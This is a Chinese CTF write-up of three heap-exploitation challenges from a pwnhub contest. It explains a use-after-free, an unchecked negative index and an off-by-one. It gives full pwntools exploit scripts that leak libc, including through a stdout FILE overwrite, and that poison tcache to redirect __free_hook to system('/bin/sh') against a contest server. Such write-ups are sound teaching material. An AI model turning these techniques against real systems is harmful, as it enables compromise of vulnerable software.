pwnhub 3 月内部赛，找学长借了个号来打打。

### sh

#### 漏洞点：ln 实现 uaf

在 bss 上存储着 sh 操作的文件，发现 ln 可以复制指向堆的指针，实现 uaf。

ln 会跳转到此处代码 `qword_A0E8[6 * mm] = qword_A0E8[6 * kk];` ，将指针复制。在内存中的效果如图。

![image-20230314145232802](https://s2.loli.net/2023/03/14/2L9lXZrxHTKhsDa.png) 

uaf 之后就能 tcache poisoning 控制 free hook。

#### 获取 libc 版本

题目没有给 libc，可以用`strings ttsc | grep 'GCC'` 命令猜一下大版本。

![image-20230314152403728](https://s2.loli.net/2023/03/14/Qmd26Epu8lerGfc.png) 

大概的对应关系：

```text
Ubuntu22.04：libc-2.35
Ubuntu20.04：libc-2.31
Ubuntu18.04：linc-2.27
Ubuntu16.04：libc-2.23
Ubuntu14.04：libc-2.19
```

小版本用 libcsearcher 试比较方便。

#### exp

```python
from pwn import *
from LibcSearcher import *

elf_path = "./sh_v1.1"
libc_path = "./libc-2.27.so"
ip = "121.40.89.206"
port = "34883"
content = 0


context(os='linux',arch='amd64',log_level='debug')
if content == 1:
    context.terminal = ['tmux','splitw','-h']
    # p = process(elf_path)
    # gdb.attach(p)
    # p = gdb.debug(elf_path)
    pause()

else:
    p = remote(ip, port)



r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
debug = lambda : gdb.attach(p)
shell = lambda : p.interactive()



# ----------------------------------------------------------

def touch(index, content):
    sla(b'>>>>', b'touch ' + str(index).encode())
    sl( content)

def ln(index1, index2):
    sla(b'>>>>', b'ln ' + str(index1).encode() +b' ' + str(index2).encode())

def rm(index):
    sla(b'>>>>', b'rm ' + str(index).encode())

def cat(index):
    sla(b'>>>>', b'cat ' + str(index).encode())

def ged(index, content):
    sla(b'>>>>', b'gedit ' + str(index).encode())
    sl( content)

# 用 unsortedbins 泄露 libc 版本
for i in range(9):
    touch(i, b'')
ln(6, 10)
ln(7, 9)
for i in range(7):
    rm(i)
rm(9)
cat(7)
malloc_hook = u64(rx(6).ljust(8, b'\x00')) - 96 -0x10
print('>>>' + hex(malloc_hook))
libc=LibcSearcher("__malloc_hook",malloc_hook)
libc_base = malloc_hook - libc.dump('__malloc_hook')

# tcache poisoning 修改 free hook
ged(10, p64(libc.dump('__free_hook') - 0x10+libc_base))
touch(11,b'')
touch(12, b'/bin/sh\x00' + p64(0) + p64(libc.dump('system')+libc_base))
rm(12)

p.interactive()

```



### three edit

由于随机化开了的话，stdout 地址的倒数第四位会变化，先把[随机化关了写](https://blog.csdn.net/counsellor/article/details/81543197)。

#### 下标未检测

一开始会分配两个大小 0x80 的chunk 存放后续分配的堆的地址和大小，因为没有检查下标是否为整数，因此可以负溢拿到 tcache entries 里面的地址，uaf。

![image-20230314185856421](https://s2.loli.net/2023/03/14/FXQYxOCwUncjzK7.png) 

#### 借用 unsortedbin 修改 stdout 泄露 libc

偷看了[这个](https://oneda1sy.gitee.io/2021/05/10/Heap-IO-LeakLibc/)。由于程序没有输出，所以可以通过修改 stdout 的 io_file 指针来输出，所以我们的目标是让 stdout 地址出现在 tcache entries 的位置。为了实现这个，可以让 stdout 出现在 tcache bins 的 fd 的位置，由于不知道 libc 基址，所以可以通过 unsortedbin 的指针来改。现在任务就变成，让 unsortedbins 的 free_chunk 出现在 tcache 中。但是根据题目的限制大小，0x50-0x70 会进入 fastbins（<= 0x70） 而非 unsortedbin。因此要先构造堆叠，改变 chunk 的 size 域，进入 unsortedbin (>0x420) （虽然超过 7 个也可以，但是每个都改大小麻烦）。

1. 堆叠
2. 放进 unsortedbin
3. 把 unsorted chunk 放进 tcache 链
4. 更改 main_arena + 96 为 stdout
5. 修改 stdout file 泄露 libc
6. tcache poisoning

修改 stdout 的 file 结构，addr 为要泄露的数据的地址。具体的 file 结构懒得写了。

```python
p64(0xfbad1800) + p64(0)*3 + p64(addr)
```

#### exp

有几处堆的大小的布置得斟酌一下。

##### add 0x50 

由于需要堆叠之后修改大小，之后要把 unsortedbins 放进 tcache，过程如下：

overlapping：

![](https://s2.loli.net/2023/03/15/WxREML4IqXtOC3b.png) 

放进 tcache

![image-20230315175304302](https://s2.loli.net/2023/03/15/WAHDUbCT6kNvoVE.png)

这两张截图不是同一次截的，每次只有后地址后三个数字可以确定，为了减少爆破的次数，只改最后一个字节，堆的大小就设置为 0x50。

##### add 0x461

修改 chunk 的大小，使其释放到 unsortedbin。当 free 超过 tcache 范围的 chunk 会检查，他的 next_chunk 的 prev_inuse（如下代码），所以可以事先 add 很多个 chunk，修改为可以刚好满足条件的 chunk 大小。

```c
if (__glibc_unlikely (!prev_inuse(nextchunk)))
  malloc_printerr ("double free or corruption (!prev)");
```

![image-20230315120539438](https://s2.loli.net/2023/03/15/gHuwtkrF4coECbD.png) 

此外设置 prev_inuse 为 1，避免检查。

```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
  unlink_chunk (av, p);
}
```

爆破概率 1/16，（之前想过直接负溢到 data 段的 stdout，不过这个速度...应该很难了

```python
from pwn import *

elf_path = "./pwn4"
libc_path = "./libc-2.31.so"
ip = "121.40.89.206"
port = "21795"
content = 1

context(os='linux',arch='amd64',log_level='debug')
if content == 1:
    context.terminal = ['tmux','splitw','-h']
    p = process(elf_path)
    # gdb.attach(p)
    # p = gdb.debug(elf_path)
    # pause()

else:
    p = remote(ip, port)

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
debug = lambda : gdb.attach(p)
shell = lambda : p.interactive()

# ----------------------------------------------------------


def add(index,size,content):
    sla(b'is:', b'1')
    sla(b'x:', str(index).encode())
    sla(b'e:', str(size).encode())
    sla(b't:', content)


def delete(index):
    sla(b'is:', b'2')
    sla(b'?', str(index).encode())


def edit(index,content):
    sla(b'is:', b'3')
    sla(b'?', str(index).encode())
    sla(b':', content)

def pwn():
    # 堆叠
    add(0, 0x70, b'')
    for i in range(1,7):
        add(i, 0x50, b'')
    for i in range(7, 13):
        add(i, 0x70, b'')
    delete(1)
    delete(6)
    edit(-0x3e, p8(0x70))
    add(1, 0x50, b'')

    # 放进 unsortedbin
    edit(-0x3e, p64(0) + p16(0x461)) # check prev size 位 & next chunk prev inuse
    delete(2)

    # 把 unsorted chunk 放进 tcache 链
    delete(3)
    delete(4)
    edit(-0x3e, p8(0x80))

    # 更改 main_arena + 96 为 stdout
    add(3, 0x50, b'')
    m = 0 # 偏移，libc 只有后三位确定
    edit(-0x3e, p16((m*0x1000 + 0x26a0)%0x10000))
    add(4, 0x50, b'')

    # 修改 stdout file 泄露 libc
    edit(-0x3e, p64(0xfbad1800) + p64(0)*3 + p16((m*0x1000 + 0x26a0)%0x10000))
    stdout = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
    print('stdout>>>' + hex(stdout))
    libc = ELF(libc_path)
    libc_base = stdout - libc.sym['_IO_2_1_stdout_']

    # tcache poisoning
    delete(9)
    delete(8)
    edit(-0x3c, p64(libc_base + libc.sym['__free_hook'] - 0x8))
    add(8, 0x70, b'')
    add(9, 0x70, b'/bin/sh\x00' + p64(libc_base + libc.sym['system']))
    delete(9)

    p.interactive()

while 1:
    try:
        p = remote(ip, port)
        pwn()
        break
    except:
        p.close()
        continue

# pwn()
```

### ttsc

#### off by one

关于 chunk 堆叠看了看[这个](https://oneda1sy.gitee.io/2021/11/16/Heap-Overlapping/)。

由于 edit 时输入的边界设置有误，可以向后写一个字节。

![image-20230314171525559](https://s2.loli.net/2023/03/14/azUq8AZEBTlJu2k.png) 

如果更改 Size 域就能实现堆叠，而由于malloc 的时候会对 size 取整，这样就能覆盖 size 域（而不仅仅是 prev_size）

```ruby
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

size 的取整：

```c
# SIZE_SZ=8
# MALLOC_ALIGN_MASK = 2*SIZE_SZ-1

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```

将更改后的 chunk free 再 malloc 就能控制它覆盖的chunk 的指针了。

#### exp

```python
from pwn import *
from LibcSearcher import *

elf_path = "./ttsc"
libc_path = "./libc-2.27.so"
ip = "121.40.89.206"
port = "20111"
content = 0

context(os='linux',arch='amd64',log_level='debug')
if content == 1:
    context.terminal = ['tmux','splitw','-h']
    p = process(elf_path)
    # gdb.attach(p)
    # p = gdb.debug(elf_path)
    # pause()

else:
    p = remote(ip, port)

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
debug = lambda : gdb.attach(p)
shell = lambda : p.interactive()

# ----------------------------------------------------------


def add(index,size,content):
    sla(b'chs:', b'1')
    sla(b'?\n', str(index).encode())
    sla(b':\n', str(size).encode())
    sl(content)


def delete(index):
    sla(b'chs:', b'2')
    sla(b'?\n', str(index).encode())


def edit(index,content):
    sla(b'chs:', b'3')
    sla(b'?\n', str(index).encode())
    sa(b':', content)

# 泄露 libc 基址 
libc = ELF(libc_path)
sa(b'name?\n', b'a'*0x10)
sla(b'age?\n', b'a')
ru(b'age: ')
addr2 = int(rud(b'\n').decode())
ru(b'high: ')
addr1 = int(rud(b'\n').decode()) 
addr = addr1*2**32 + addr2
libc_base = addr - libc.sym['_IO_file_jumps']

# off by one 构造堆叠
add(0, 0x28, b'')
add(1, 0x20, b'')
add(2, 0x20, b'')
edit(0, b'a'*0x28 + b'\x81')
delete(0)
delete(1)
delete(2)

# tcache poisoning
add(1, 0x70, b'a'*0x28 + p64(0x81) + p64(libc_base + libc.sym['__free_hook']-0x8))
add(0, 0x20, b'')
add(3, 0x20, b'/bin/sh\x00' + p64(libc_base + libc.sym['system']))
delete(3)

p.interactive()
```

### ps

tototo 鸽一下，做飞柱去咯！